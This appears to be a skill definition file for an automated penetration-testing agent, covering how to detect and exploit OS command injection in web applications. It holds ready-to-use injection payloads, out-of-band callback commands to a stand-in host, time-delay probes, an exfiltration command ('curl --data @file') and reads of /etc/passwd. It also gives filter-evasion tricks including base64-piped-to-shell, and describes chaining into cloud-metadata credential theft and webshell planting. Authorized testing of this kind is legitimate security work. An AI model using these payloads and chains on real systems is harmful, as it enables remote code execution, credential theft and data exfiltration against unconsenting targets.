---
name: web-command-injection
description: >
  Detect and exploit OS command injection (CWE-78). USE WHEN a parameter reaches
  a shell (ping/nslookup/whois utilities, file converters, PDF/image tooling,
  archive handlers, git/svn wrappers, backup or "export" features) or when output
  hints at a spawned process. Covers in-band ( ;id / $(id) / `id` / | / & ),
  argument injection, and blind injection proven by time delay or an out-of-band
  DNS/HTTP callback across Linux and Windows targets.
tags: [web, injection, command-injection, rce, oob, blind, owasp-a03]
tools: [httpx, nuclei, ffuf]
payloads:
  - {kind: glob, path: "vendor/PayloadsAllTheThings/Command Injection/**/*.txt", license: MIT, credit: "swisskyrepo/PayloadsAllTheThings"}
  - {kind: glob, path: "vendor/PayloadsAllTheThings/Command Injection/*.md", license: MIT, credit: "swisskyrepo/PayloadsAllTheThings"}
  - {kind: inline, inline: ["; id", "| id", "& id", "&& id", "$(id)", "`id`", "%0aid", "; nslookup CID.OOBHOST", "$(nslookup CID.OOBHOST)", "`ping -c1 CID.OOBHOST`", "; sleep 10", "|| sleep 10 ||", "& ping -n 11 127.0.0.1 &"], license: MIT, credit: "swisskyrepo/PayloadsAllTheThings"}
verification:
  kind: oob
  expect: {protocols: [dns, http], timeout_secs: 30}
  signals:
    - "uid="
    - "gid="
    - "groups="
    - "Microsoft Windows [Version"
    - "Volume in drive"
    - "Directory of"
references:
  - https://portswigger.net/web-security/os-command-injection
  - https://owasp.org/www-community/attacks/Command_Injection
  - https://cwe.mitre.org/data/definitions/78.html
license: AGPL-3.0-or-later
version: 1.0.0
---
# OS Command Injection — CWE-78

Prove that attacker input reaches a shell and runs a command of your choosing. The
0-FP discipline: a reflected string or a stack trace is **not** proof. The
unambiguous oracles are an **out-of-band DNS/HTTP callback** the target itself
emits, a **controlled time delay**, or verbatim **command output** (`uid=…`) in
the response. Detect broadly, confirm deterministically.

## Sub-variants
- **In-band separator** — chain a second command with `;`, `|`, `&`, `&&`, `||`,
  newline (`%0a`), or command substitution `$(cmd)` / `` `cmd` ``.
- **Argument injection** — you cannot break out of the command but can smuggle
  extra flags (`-o`, `--output`, `--upload-file`, `-e` for `curl`/`ssh`/`tar`).
- **Blind (time-based)** — no output echoed; a `sleep`/`ping -c` delay is the tell.
- **Blind (OOB)** — no output, no reliable timing; force a `nslookup`/`curl`/
  `certutil`/`ping` to your correlation host and catch the callback.
- **Windows vs Linux** — `&`/`|` work on both; `$(...)`/backticks are POSIX;
  Windows uses `powershell`/`certutil`/`nslookup`, markers differ.

## Methodology (recon → probe → confirm → exploit → chain)
1. **Recon.** `exec` capture the request; flag every param whose *purpose* implies
   a subprocess (hostnames, filenames, format/codec selectors, URLs handed to a
   CLI). `decode` encoded values so the true sink is visible.
2. **Probe.** `fuzz` a separator set (`;id`, `|id`, `&&id`, `$(id)`, `` `id` ``,
   `%0aid`) plus a benign baseline. Anomaly-rank on status/length/time — the param
   whose response gains `uid=` or diverges is the candidate.
3. **Confirm (deterministic).**
   - *OOB (primary, `verify.py` default):* inject `$(nslookup <cid>.<oobhost>)` /
     `;curl http://<cid>.<oobhost>/` and let the `oob` oracle poll the collaborator
     (`req list --protocol dns|http`). A callback carrying the correlation id proves
     the command ran — impossible to fake.
   - *Timing (fallback):* `fuzz` `;sleep 10` (POSIX) / `& ping -n 11 127.0.0.1 &`
     (Windows) and the `timing` oracle asserts the slowest result crosses
     `threshold_ms`. A controllable delay cannot be coincidence.
   - *Signature (fallback):* the `signature` oracle matches command output —
     `uid=`, `gid=`, `groups=` (POSIX `id`), `Microsoft Windows [Version`,
     `Volume in drive`, `Directory of` (Windows `ver`/`dir`).
4. **Exploit.** Escalate carefully to enumeration (`whoami`, `hostname`, env,
   `/etc/passwd` read) — still captured in-session. Prefer OOB exfil of output
   (`curl --data @file`) when the response is blind.
5. **Evasion.** Filtered spaces → `${IFS}`, `<`, `{cat,/etc/passwd}`; filtered
   keywords → concatenation (`c''at`, `w\ho\ami`), base64 `|base64 -d|sh`. Re-run
   the OOB/timing oracle after each bypass.

## Cross-chain notes
- Command injection in a JWT `kid` (`web-jwt-auth`) or a template sink (`web-ssti`)
  reaches the same shell — share the OOB correlation host.
- RCE → SSRF (`curl` to `169.254.169.254`) → cloud-metadata creds (`web-ssrf`).
- Argument injection into `curl`/`wget` → arbitrary file write → webshell
  (`web-file-upload`).

## False-positive traps
- A reflected payload or an error page mentioning "sh" is not injection — require
  an OOB callback, a controlled delay, or verbatim command output.
- Response latency from network jitter is not a timing hit — the `timing` oracle
  needs the *slowest controllable* payload to cross threshold, not any slow request.
- Timing false positives on load-spiking endpoints: cross-check with a `sleep 0`
  control, or prefer the OOB oracle.

## Key payload sources
- PortSwigger OS command injection labs / cheat sheet — `references`.
- `vendor/PayloadsAllTheThings/Command Injection/` (separators, `${IFS}` and
  filter-bypass tricks, Windows one-liners, blind exfil templates).

## Verification oracle
Primary `oob` (DNS/HTTP callback from the target carrying the correlation id).
Fallbacks: `timing` (controlled `sleep`/`ping`), `signature` (`uid=`, `gid=`,
`Microsoft Windows [Version`, `Volume in drive`). `verify.py` selects the strongest
oracle the caller wired inputs for; a lone reflection is rejected.
